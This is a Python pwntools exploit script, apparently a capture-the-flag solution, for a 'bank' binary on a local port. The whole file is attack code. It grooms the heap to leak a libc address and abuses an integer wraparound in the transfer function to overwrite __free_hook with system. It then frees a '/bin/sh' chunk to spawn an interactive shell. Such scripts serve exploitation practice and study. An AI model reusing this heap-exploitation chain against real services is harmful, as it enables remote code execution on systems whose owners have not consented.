#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
import re

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './bank'
context.terminal = ['tmux', 'new-window']
argv = []
env = {}
libc = ELF('./libc-2.31.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def create(name):
    io.sendlineafter("=> ", str(1))
    io.sendafter("account: ", name)

def delete(idx):
    io.sendlineafter("=> ", str(2))
    io.sendlineafter("delete: ", str(idx))

def view(idx):
    io.sendlineafter("=> ", str(3))
    io.sendlineafter("view: ", str(idx))

def get_loan(idx, amt):
    io.sendlineafter("=> ", str(4))
    io.sendlineafter("borrow: ", str(amt))
    io.sendlineafter("loan: ", str(idx))

def transfer(fro, to, amt):
    io.sendlineafter("=> ", str(5))
    io.sendlineafter("from: ", str(fro))
    io.sendlineafter("to: ", str(to))
    io.sendlineafter("amount: ", str(amt))

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)

create("A") #0
create("A") #1
create("A") #2

for i in range(2):
    create("A") # 3, 4

delete(0)
delete(1)

get_loan(2, 1000)
transfer(2, 1, 0x1)

create("A"*8) #0

# fake chunk to be freed into unsorted bin
create(p64(0x441)) #1
create("A") #5
delete(0)

create(b"A"*8) #0

view(2)

leaks = io.recvline()
leaks = re.search(r'\d+', leaks[14:].decode()).group()
leaks = int(leaks, 10)

libc.address = (leaks) - 0x1ebbe0 - 0x1000

print(hex(libc.address))

create("A")

delete(5)
delete(6)

view(2)
leaks = io.recvline()
leaks = re.search(r'\d+', leaks[14:].decode()).group()
leaks = int(leaks, 10)

print(hex(leaks))

print(hex(libc.sym['__free_hook']))

get_loan(4, 2**64 - 1)

transfer(4, 6, (libc.sym['__free_hook'] - leaks) >> 8)

create("A")
create(p64(0)*10+ p64(libc.sym['system']))

transfer(4, 5, u64(b'/bin/sh\x00'))
delete(5)

io.interactive()
